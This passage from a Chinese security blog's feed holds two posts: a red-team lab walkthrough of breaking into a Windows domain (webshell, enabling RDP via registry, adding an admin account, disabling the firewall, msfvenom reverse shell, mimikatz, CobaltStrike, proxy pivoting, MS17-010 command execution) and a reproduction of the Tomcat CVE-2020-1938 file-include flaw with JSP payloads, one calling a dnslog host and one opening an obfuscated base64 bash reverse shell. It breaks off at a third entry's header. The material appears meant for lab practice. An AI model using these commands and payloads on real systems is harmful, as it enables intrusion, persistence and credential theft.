src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/04.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>shell地址为：<a href="http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php">http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php</a></p><p>蚁剑连接即可获得shell（蚁剑不用代理）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/05.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="2-2phpmyadmin后台getshell"><a href="#2-2phpmyadmin后台getshell" class="headerlink" title="2.2phpmyadmin后台getshell"></a>2.2phpmyadmin后台getshell</h3><p> 此处过程略过，感兴趣小伙伴可以自己尝试。</p><h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="3-1尝试远程登录"><a href="#3-1尝试远程登录" class="headerlink" title="3.1尝试远程登录"></a>3.1尝试远程登录</h3><p> 查看当前用户权限，因为一般拿下window的话都会尝试去连接它的远程桌面，所以再查看一下3389端口开放情况</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/06.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>没有回显，即3389并没有开启或者默认端口被改。</p><p>使用<code>tasklist /svc</code>命令查看服务中存在<code>TermService</code>的PID号，未发现该服务，确定3389端口未开启。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/07.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>我们使用以下命令开启它（win7、win2003、winxp），运行后显示3389端口已经成功开启（关闭命令把如下0都换成1），当然还有其他开3389的方法，随便用哪种：</p><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/08.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>由于权限较高，直接使用cmd命令 添加用户</p><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> Aa123456 /add <span class="hljs-comment"># 添加账户密码</span>net localgroup administrators ice /add <span class="hljs-comment"># 给ice账户添加为管理员权限</span>net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> <span class="hljs-comment"># 查询是否成功添加ice用户</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/09.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用账号：ice，密码：Aa123456 登录远程桌面。但是登陆失败，nmap扫描3389端口发现状态为filtered。查看win7，防火墙开启了阻止所有与未在允许程序列表中的程序的连接，换句话说，设置了白名单，只能本地连接。</p><p>由于这里权限较高，我们可以直接在shell中使用<code>netsh advfirewall set allprofiles state off</code>命令关闭防火墙</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>关闭防火墙后利用远程桌面连接服务器即可</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/11.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-2msf反弹shell"><a href="#3-2msf反弹shell" class="headerlink" title="3.2msf反弹shell"></a>3.2msf反弹shell</h3><p>使用msf反弹一个shell。msf生成shell.exe，用蚁剑上传至win7，再在msf设置监听，在蚁剑上执行shell.exe，可以看到msf成功获得一个meterpreter</p><pre><code class="hljs routeros">15:57 root@iceH:~ <span class="hljs-variable">$msfvenom</span> -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.66.130 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe<span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> Arch selected, selecting Arch: x86 <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payloadPayload size: 341 bytesFinal size of exe file: 73802 bytes</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/12.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-3mimikatz获取账号密码"><a href="#3-3mimikatz获取账号密码" class="headerlink" title="3.3mimikatz获取账号密码"></a>3.3mimikatz获取账号密码</h3><p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p><pre><code class="hljs arduino">migrate PIDload mimikatzmimikatz_command -f sekurlsa::searchPasswords</code></pre><p>ps命令查看进程ID，一般选择explorer.exe对应的PID，但是这里它不是system权限，选择注入其他合法进程。</p><p>这一步中我没有成功读出密码 。</p><h3 id="3-4派生CobaltStrike权限"><a href="#3-4派生CobaltStrike权限" class="headerlink" title="3.4派生CobaltStrike权限"></a>3.4派生CobaltStrike权限</h3><p>先在CS上设置监听</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/13.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p> 拥有msf shell的攻击机与搭建cobaltstrike的服务端不需要是同一台主机，端口相通即可实现远程派生shell</p><pre><code class="hljs sql"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/payload_inject<span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http<span class="hljs-keyword">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span><span class="hljs-keyword">set</span> lhost xxxx                   <span class="hljs-comment">#cobaltstrike监听的ip</span><span class="hljs-keyword">set</span> lport <span class="hljs-number">14444</span>                  <span class="hljs-comment">#cobaltstrike监听的端口 </span><span class="hljs-keyword">set</span> <span class="hljs-keyword">session</span> <span class="hljs-number">1</span>                    <span class="hljs-comment">#这里是当前获得的session的id</span>exploit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/14.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>可以看到cs成功接收到shell</p><h3 id="3-5域信息收集"><a href="#3-5域信息收集" class="headerlink" title="3.5域信息收集"></a>3.5域信息收集</h3><p>渗透测试的本质是信息收集，先记录一些常用命令</p><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span>net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>ipconfig <span class="hljs-string">/all</span> 　　　　　  <span class="hljs-comment">#查询本机IP段，所在域等 </span>net config Workstation  <span class="hljs-comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span>net user 　　　　　　　   <span class="hljs-comment">#本机用户列表</span>net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>   <span class="hljs-comment">#查看域内所有的主机名 </span>net group <span class="hljs-string">&quot;domain admins&quot;</span> <span class="hljs-string">/domain</span>      <span class="hljs-comment">#查看域管理员 </span>net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span> <span class="hljs-comment">#查看域控</span>net localhroup administrators          <span class="hljs-comment">#本机管理员[通常含有域用户]</span>net user 用户名 <span class="hljs-string">/domain</span>                 <span class="hljs-comment">#获取指定用户的账户信息  </span>net group <span class="hljs-string">/domain</span>                      <span class="hljs-comment">#查询域里面的工作组 </span>net group 组名 <span class="hljs-string">/domain</span>                  <span class="hljs-comment">#查询域中的某工作组</span></code></pre><p>ipconfig /all看到有内网ip，有域</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/15.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域列表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/16.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询同域机器</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/17.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>判断主域</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/18.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域用户</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/19.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>显示当前域中的计算机列表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/20.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>整理一下信息</p><p>域：god.org</p><p>域内有三个用户：Administrator、ligang、liukaifeng01</p><p>域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA</p><p>域控：OWA(192.168.52.138)</p><p> win7内网ip：192.168.52.143</p><h2 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h2><h3 id="4-1添加路由、挂Socks4a代理"><a href="#4-1添加路由、挂Socks4a代理" class="headerlink" title="4.1添加路由、挂Socks4a代理"></a>4.1添加路由、挂Socks4a代理</h3><p>添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递</p><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p><p>（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</p><p> 添加内网路由</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/21.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>arp -a查看一下所有接口的当前 ARP 缓存表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/22.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>设置代理，设置成功后打开其他程序需前加上proxychains</p><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">use</span> auxiliary/<span class="hljs-keyword">server</span>/socks4amsf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">show</span> options<span class="hljs-keyword">Module</span> options (auxiliary/<span class="hljs-keyword">server</span>/socks4a):   <span class="hljs-keyword">Name</span>     <span class="hljs-keyword">Current</span> Setting  <span class="hljs-keyword">Required</span>  Description   <span class="hljs-comment">----     ---------------  --------  -----------</span>   SRVHOST  <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>          yes       The address <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>   SRVPORT  <span class="hljs-number">1080</span>             yes       The port <span class="hljs-keyword">to</span> listen on.Auxiliary <span class="hljs-keyword">action</span>:   <span class="hljs-keyword">Name</span>   Description   <span class="hljs-comment">----   -----------</span>   Proxy  msf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run[*] Auxiliary <span class="hljs-keyword">module</span> running <span class="hljs-keyword">as</span> background job <span class="hljs-number">0.</span>[*] <span class="hljs-keyword">Starting</span> the socks4a proxy <span class="hljs-keyword">server</span></code></pre><p>然后打开/etc/proxychains.conf（原始端口是9050，改为我们设置的1080）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/23.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>测试一下可以成功访问192.168.52.0网段</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/24.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-2拿下第二台主机"><a href="#4-2拿下第二台主机" class="headerlink" title="4.2拿下第二台主机"></a>4.2拿下第二台主机</h3><p>扫描一下VM2（192.168.52.141）proxychains nmap -p 1-1000 -Pn -sT 192.168.52.141</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/25.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开放了445端口，所以利用<code> use auxiliary/scanner/smb/smb_version</code> 可以扫描系统版本，扫描结果是<code>win2003</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/26.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用<code>ms08-067</code>打一下，发现打不了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/27.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开始尝试<code>ms17-010</code>，使用<code>auxiliary/scanner/smb/smb_ms17_010</code>对52这个段进行扫描，发现三台主机都存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/28.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>利用<code>exploit/windows/smb/ms17_010_psexec</code>对<code>192.168.52.141</code>进行攻击，发现没办法弹回shell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/29.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>发现可以使用<code>auxiliary/admin/smb/ms17_010_command</code>来执行一些命令且是系统权限。</p><pre><code class="hljs shell">use auxiliary/admin/smb/ms17_010_commandshow optionsset rhosts 192.168.52.141set command &quot;net user ice Aa123456 /add&quot; #添加用户exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/30.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &quot;net localgroup administrators ice /add&quot; #管理员权限exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/31.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/32.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>然后使用<code>proxychains</code>连接他的3389，<code>proxychains rdesktop 192.168.52.141</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/33.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-3拿下域控"><a href="#4-3拿下域控" class="headerlink" title="4.3拿下域控"></a>4.3拿下域控</h3><p>pass</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队实战</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</title>
    <link href="/p/933884b8.html"/>
    <url>/p/933884b8.html</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h3><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h3 id="0x02-前提"><a href="#0x02-前提" class="headerlink" title="0x02 前提"></a>0x02 前提</h3><ul><li><p>目标机器开启AJP Connector 服务端口（默认开启，为8009端口）</p><a id="more"></a></li></ul><h3 id="0x03-文件读取-amp-文件包含RCE"><a href="#0x03-文件读取-amp-文件包含RCE" class="headerlink" title="0x03 文件读取&amp;文件包含RCE"></a>0x03 文件读取&amp;文件包含RCE</h3><ul><li>文件读取</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 192.168.52.130</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/01.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>文件包含</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 192.168.52.130</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/02.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>test.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;ping mdd7e.dnslog.cn&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><h3 id="0x04-反弹shell"><a href="#0x04-反弹shell" class="headerlink" title="0x04 反弹shell"></a>0x04 反弹shell</h3><ul><li>shell.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjE0My84OTg5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/03.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="http://www.svenbeast.com/post/fqSI9laE8/">http://www.svenbeast.com/post/fqSI9laE8/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Tomcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>佛学的魔改.net Ueditor</title>
    <link href="/p/256d1eb.html"/>
    <url>/p/256d1eb.html</url>
    
